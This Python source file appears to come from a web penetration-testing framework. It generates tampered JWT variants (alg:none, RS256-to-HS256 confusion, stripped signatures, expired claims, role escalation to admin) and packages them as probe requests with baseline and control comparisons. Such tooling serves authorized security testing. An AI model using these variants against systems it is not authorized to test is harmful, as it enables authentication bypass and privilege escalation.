"""JWT manipulation probes: alg:none, stripping, expiry, role tampering.

PURE LOGIC ONLY. No I/O, no network, no cryptographic forging against a live
key. This module decodes/edits/re-encodes compact JWTs with base64url + JSON
from the standard library and defines the exact variant catalog AVI executes
through the governed boundary.

Scenarios from the sprint brief:

a. alg:none            — signature removed, header alg set to "none"
b. algorithm confusion — alg changed RS256 -> HS256 (key-confusion class)
c. signature stripping — signature segment emptied
d. expired token       — exp moved into the past
e. role manipulation   — role/sub claim escalated to admin

The canonical validator ``validate_jwt_manipulation`` lives in
``webpent.production.validators``. It confirms only when a tampered token is
ACCEPTED at a protected endpoint that baseline/control deny — never from the
mere presence of a token being parsed.
"""
from __future__ import annotations

import base64
import json
from dataclasses import dataclass, field
from typing import Any

JWT_EXPERIMENT_ID = "exp_jwt_manipulation_v1"
JWT_FAMILY = "JWT_MANIPULATION"

JWT_MANIPULATION_SCENARIOS: tuple[str, ...] = (
    "alg_none",
    "algorithm_confusion",
    "signature_stripped",
    "expired",
    "role_manipulation",
)

# Claims the module is willing to manipulate. Everything else is preserved so a
# variant only ever differs from the source token in a bounded, reviewable way.
ESCALATED_ROLE_VALUES = ("admin", "administrator", "root", "superuser")
DEFAULT_ESCALATED_ROLE = "admin"


def _b64url_decode(segment: str) -> bytes:
    padding = "=" * (-len(segment) % 4)
    return base64.urlsafe_b64decode(segment + padding)


def _b64url_encode(raw: bytes) -> str:
    return base64.urlsafe_b64encode(raw).rstrip(b"=").decode("ascii")


def decode_jwt(token: str) -> dict[str, Any]:
    """Decode a compact JWT WITHOUT verifying the signature.

    Returns header/payload/signature plus a ``valid_structure`` flag. Never
    raises on malformed input — an undecodable token yields valid_structure=False.
    """
    result: dict[str, Any] = {
        "header": {}, "payload": {}, "signature": "",
        "segment_count": 0, "valid_structure": False,
    }
    parts = str(token or "").split(".")
    result["segment_count"] = len(parts)
    if len(parts) < 2:
        return result
    try:
        header = json.loads(_b64url_decode(parts[0]).decode("utf-8", "replace"))
        payload = json.loads(_b64url_decode(parts[1]).decode("utf-8", "replace"))
    except (ValueError, TypeError):
        return result
    if not isinstance(header, dict) or not isinstance(payload, dict):
        return result
    result["header"] = header
    result["payload"] = payload
    result["signature"] = parts[2] if len(parts) > 2 else ""
    result["valid_structure"] = True
    return result


def encode_jwt(header: dict[str, Any], payload: dict[str, Any], signature: str = "") -> str:
    """Re-encode a JWT from explicit header/payload/signature parts."""
    head = _b64url_encode(json.dumps(header, separators=(",", ":"), sort_keys=True).encode("utf-8"))
    body = _b64url_encode(json.dumps(payload, separators=(",", ":"), sort_keys=True).encode("utf-8"))
    return f"{head}.{body}.{signature}"


@dataclass(frozen=True)
class JWTTokenSource:
    """Where a captured JWT was seen, so the probe can replay it correctly."""

    location: str  # "header" | "cookie" | "query"
    name: str = "Authorization"
    scheme: str = "Bearer"


@dataclass(frozen=True)
class JWTVariant:
    """One tampered JWT variant plus the reasoning that justifies it."""

    scenario: str
    token: str
    description: str
    mutates: tuple[str, ...] = field(default_factory=tuple)

    def as_hypothesis(self, *, target_url: str, hypothesis_id: str,
                      protected_path: str, source: JWTTokenSource | None = None) -> dict[str, Any]:
        """Project to the AVI hypothesis shape (advisory input, no credentials)."""
        src = source or JWTTokenSource(location="header")
        # The tampered token carries NO valid credential: it must be presented at
        # a protected route and compared against the same route with no token
        # (baseline/control) so acceptance proves the server skipped validation.
        candidate_headers = {src.name: f"{src.scheme} {self.token}".strip()}
        requests: dict[str, dict[str, Any]] = {
            "baseline": {
                "method": "GET",
                "path": protected_path,
            },
            "candidate": {
                "method": "GET",
                "path": protected_path,
                "headers": candidate_headers,
                "content_type": "application/json",
            },
            "negative_control": {
                "method": "GET",
                "path": protected_path,
                "headers": {src.name: f"{src.scheme} not_a_jwt_control_value".strip()},
                "content_type": "application/json",
            },
        }
        if src.location == "cookie":
            requests["candidate"]["headers"] = {"Cookie": f"{src.name}={self.token}"}
            requests["negative_control"]["headers"] = {"Cookie": f"{src.name}=not_a_jwt_control_value"}
        elif src.location == "query":
            requests["candidate"] = {"method": "GET", "path": f"{protected_path}?{src.name}={self.token}"}
            requests["negative_control"] = {
                "method": "GET", "path": f"{protected_path}?{src.name}=not_a_jwt_control_value",
            }
        return {
            "id": hypothesis_id,
            "hypothesis_id": hypothesis_id,
            "vulnerability_class": JWT_FAMILY,
            "api_type": "rest",
            "path": protected_path,
            "method": "GET",
            "information_value": 0.95,
            "requests": requests,
            "family_contract_version": "v1",
            "executable": True,
            "hypothesis_template": (
                "a protected endpoint may accept a tampered JWT "
                f"({self.scenario}) whose signature/integrity was never verified"
            ),
            "expected_evidence": [
                "candidate_tampered_token_accepted",
                "baseline_unauthenticated_denied",
                "control_invalid_token_denied",
            ],
            "target_url": str(target_url),
            "metadata": {
                "experiment_id": JWT_EXPERIMENT_ID,
                "scenario": self.scenario,
                "token_location": src.location,
                "token_header_name": src.name,
                "mutates": list(self.mutates),
                "description": self.description,
            },
        }


def _base_payload(payload: dict[str, Any]) -> dict[str, Any]:
    return dict(payload)


def build_jwt_variants(
    token: str,
    *,
    scenarios: tuple[str, ...] | None = None,
    escalated_role: str = DEFAULT_ESCALATED_ROLE,
) -> list[JWTVariant]:
    """Build the tampered variants for a captured compact JWT.

    Fail-closed: an undecodable token yields an empty list (never a fabricated
    variant), because the module must not guess at a token it cannot parse.
    """
    decoded = decode_jwt(token)
    if not decoded["valid_structure"]:
        return []
    header = dict(decoded["header"])
    payload = dict(decoded["payload"])
    signature = str(decoded.get("signature", ""))
    wanted = tuple(str(item).lower() for item in scenarios) if scenarios else JWT_MANIPULATION_SCENARIOS
    variants: list[JWTVariant] = []
    for scenario in wanted:
        if scenario == "alg_none":
            h = dict(header); h["alg"] = "none"; h["typ"] = h.get("typ", "JWT")
            variants.append(JWTVariant(
                scenario="alg_none",
                token=encode_jwt(h, _base_payload(payload), ""),
                description="header alg set to none with the signature removed",
                mutates=("header.alg", "signature"),
            ))
        elif scenario == "algorithm_confusion":
            h = dict(header)
            current = str(h.get("alg", "")).upper()
            h["alg"] = "HS256" if current.startswith("RS") or current.startswith("ES") else "none"
            variants.append(JWTVariant(
                scenario="algorithm_confusion",
                token=encode_jwt(h, _base_payload(payload), signature),
                description="header alg switched to HS256 (key-confusion class) while signature is reused",
                mutates=("header.alg",),
            ))
        elif scenario == "signature_stripped":
            variants.append(JWTVariant(
                scenario="signature_stripped",
                token=encode_jwt(header, _base_payload(payload), ""),
                description="signature segment removed entirely",
                mutates=("signature",),
            ))
        elif scenario == "expired":
            p = _base_payload(payload)
            # 1 is a deterministic past instant that no correct implementation
            # would accept; it removes any reliance on wall-clock reads here.
            p["exp"] = 1
            p["iat"] = 0
            variants.append(JWTVariant(
                scenario="expired",
                token=encode_jwt(header, p, signature),
                description="exp/iat moved into the past while the original signature is preserved",
                mutates=("payload.exp", "payload.iat"),
            ))
        elif scenario == "role_manipulation":
            p = _base_payload(payload)
            mutated: list[str] = []
            for claim in ("role", "roles", "is_admin", "isAdmin", "admin", "privilege", "scope"):
                if claim in p:
                    p[claim] = escalated_role
                    mutated.append(f"payload.{claim}")
            if not mutated:
                p["role"] = escalated_role
                mutated.append("payload.role")
            variants.append(JWTVariant(
                scenario="role_manipulation",
                token=encode_jwt(header, p, signature),
                description=f"role claim escalated to {escalated_role!r} while the signature is unchanged",
                mutates=tuple(mutated),
            ))
    return variants


def extract_jwt_from_headers(headers: dict[str, Any], *, name: str = "Authorization") -> str | None:
    """Extract a compact JWT from a header map or Cookie value (read-only)."""
    lowered = {str(k).lower(): v for k, v in (headers or {}).items()}
    auth = str(lowered.get(name.lower(), "") or "")
    if auth:
        parts = auth.split()
        candidate = parts[-1] if parts else ""
        if candidate.count(".") == 2:
            return candidate
    for cookie_key in ("cookie", "set-cookie"):
        raw = str(lowered.get(cookie_key, "") or "")
        for chunk in raw.split(";"):
            piece = chunk.strip()
            if "=" in piece:
                value = piece.split("=", 1)[1].strip()
                if value.count(".") == 2:
                    return value
    return None


def analyze_jwt_response(evidence: dict[str, Any], *, scenario: str) -> dict[str, Any]:
    """Extract validator-readable signals from one redacted observation."""
    status = _status_code(evidence)
    body = str(evidence.get("response_body", evidence.get("body", "")))
    lowered = body.lower()
    denied_marker = any(
        marker in lowered
        for marker in ("unauthorized", "forbidden", "invalid token", "authentication required", "login")
    )
    authenticated = 200 <= status < 300 and not denied_marker
    return {
        "_jwt_status": status,
        "_jwt_accepted": bool(authenticated),
        "_jwt_denied_marker": denied_marker,
        "_jwt_scenario": str(scenario),
    }


def _status_code(evidence: dict[str, Any]) -> int:
    raw = evidence.get("status_code", evidence.get("status", 0))
    try:
        return int(raw) if raw is not None else 0
    except (TypeError, ValueError):
        return 0


__all__ = [
    "JWT_EXPERIMENT_ID",
    "JWT_FAMILY",
    "JWT_MANIPULATION_SCENARIOS",
    "ESCALATED_ROLE_VALUES",
    "DEFAULT_ESCALATED_ROLE",
    "JWTTokenSource",
    "JWTVariant",
    "analyze_jwt_response",
    "build_jwt_variants",
    "decode_jwt",
    "encode_jwt",
    "extract_jwt_from_headers",
]
